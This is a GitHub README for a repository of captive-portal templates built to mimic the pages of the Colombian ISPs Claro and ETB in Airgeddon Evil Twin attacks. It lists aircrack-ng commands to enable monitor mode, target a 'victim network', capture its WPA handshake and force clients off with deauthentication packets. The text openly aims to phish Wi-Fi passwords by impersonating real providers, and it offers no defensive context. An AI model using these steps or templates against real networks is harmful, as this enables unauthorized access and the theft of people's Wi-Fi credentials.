# Airgeddon-Custom-Captive-Portal-Templates
Github repo from YouTube tutorial about customizing Airgeddon's Captive Portal template.

YouTube Video: https://youtu.be/M0TMHRuA2To

It's recommended to previously have captured the handshake as Airgeddon only gives 100 seconds tops to do this. Also, to take note of the MAC address of the network to update it in the check.htm file.

1. airmon-ng start wlan0 (Enable monitor mode)
2. airodump-ng wlan0mon (Listen to all networks. Jot down the BSSID and channel the network is in)
3. airodump-ng --bssid [MAC] --channel 1 -w wpa_log wlan0mon (Listen only to the victim network, capturing the handshake)

* It may be necessary to de-authenticate the clients for them to connect again and grab the handshake.
aireplay-ng --deauth 20 -a [MAC] wlan0mon
If -c [client] is specified, only that mac's user device will be de-authenticated.

#################################################################################################################################################################################################################################

ENG:  This is not mine, I actually edited the templates of this video: (https://youtu.be/M0TMHRuA2To) all credit goes to him.
      This repository is an edition of the HTML and CSS code to be similar to that of some Colombian Internet providers,
      when trying to make an Evil Twin attack with a captivating portal through Airgeddon.
      I hope to add more templates to the list over time.

ESP:  Esto no es mío, Realmente edite las plantillas de este video: (https://youtu.be/M0TMHRuA2To) todo el crédito es para él.
      Este repositorio es una edicion del código HTML y CSS para que sea similar al de algunos proveedores de Internet colombianos,
      cuando se esta intentando hacer un ataque de Evil Twin con portal captativo por medio de Airgeddon.
      Espero agregar más plantillas a la lista con el tiempo.

##################################################################################################################################################################################################################################

List \\ Lista:
-claro
-ETB
